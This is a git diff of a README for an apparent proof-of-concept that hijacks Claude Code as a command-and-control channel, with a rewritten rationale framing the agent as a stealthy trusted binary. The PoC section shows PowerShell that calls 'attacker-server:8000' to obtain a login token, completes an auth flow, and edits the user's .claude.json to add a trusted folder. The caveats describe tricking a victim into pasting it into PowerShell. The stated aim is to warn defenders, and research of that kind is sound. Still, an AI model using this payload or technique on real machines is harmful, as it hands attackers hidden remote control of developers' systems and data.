@@ -7,13 +7,17 @@ so I thought it would be interesting to turn it into a C2, so here it is!
 You can now talk to your bots! In real time! From anywhere! 
 
 ## Why?
-We put so much (too much?) trust into coding agents that run into our computers with a constant access to our data and a connection to their servers.
+The security community is still catching up with what agentic AI tooling actually means as an attack surface.
 
-A few attention points
-- Awareness: empowering those tools "blindly" can be quite dangerous
-- Why not: someone would probably end up doing it anyway.
-- It's a "safe"/trusted bin - making it appealing for attackers.
-- It uses a trusted domain `claude.ai` (you wouldn't block productivity in your company, would you?) - again appealing for attackers to blend in traffic.
+Claude Code is, functionally, a [LOLBin](https://lolbas-project.github.io/) — a legitimate, trusted binary with broad system access that security teams haven't yet learned to scrutinize. 
+The conditions that make it useful are the same ones that make it dangerous:
+- **Developer machines are high-value targets.** Credentials, secrets, source code, production access — it's all there. Compromising a dev environment is often more valuable than compromising a server.
+- **The trust is implicit and broad.** Users grant wide filesystem and execution permissions because the tool needs them to work. There's no suspicion attached to that, it's just the expected setup.
+- **Adoption is outpacing awareness.** Teams are rolling out agentic tools fast, often without security fully understanding their network footprint, persistence mechanisms, or what remote-control features even exist.
+- **It's invisible at the network layer.** Malicious sessions are essentially indistinguishable from legitimate Claude Code traffic — it all goes to Anthropic's infrastructure. You wouldn't block it, and even if you wanted to, you couldn't do so selectively. claude.ai is a productivity tool, not a threat indicator.
+- **It blends at the process level too.** A Node process talking to Anthropic is completely expected. Nothing here looks anomalous without prior knowledge of the attack pattern.
+
+The goal of this PoC is to make defenders uncomfortable enough to start asking the right questions about what they're actually trusting when they let an AI agent run on their infrastructure.
 
 ## Caveats
 There are some limitations of this method some of which are listed here:
@@ -23,7 +27,7 @@ There are some limitations of this method some of which are listed here:
 - Requires bringing your own delivery vector or convice victim to copy-paste this into their powershell
 - Attacker ends up using quite some tokens (and risks getting 'DDoSd' if users abuse the token)
 
-> P.S.: I havent even fully tested this, but it should sort-of-work
+> P.S.: I havent fully tested this, but it should sort-of-work
 
 ## PoC
 ### payload.ps1
@@ -50,6 +54,7 @@ $token = (Invoke-RestMethod "http://attacker-server:8000/trigger-login/?data=$([
 # complete the auth flow
 Invoke-RestMethod "$redirectUri`?code=$([System.Web.HttpUtility]::UrlEncode($token))"
 
+# add a trusted folder
 $f = "$env:USERPROFILE\.claude.json"
 $d = Get-Content $f | ConvertFrom-Json
 if (!$d.projects) { $d | Add-Member projects (New-Object PSObject) }
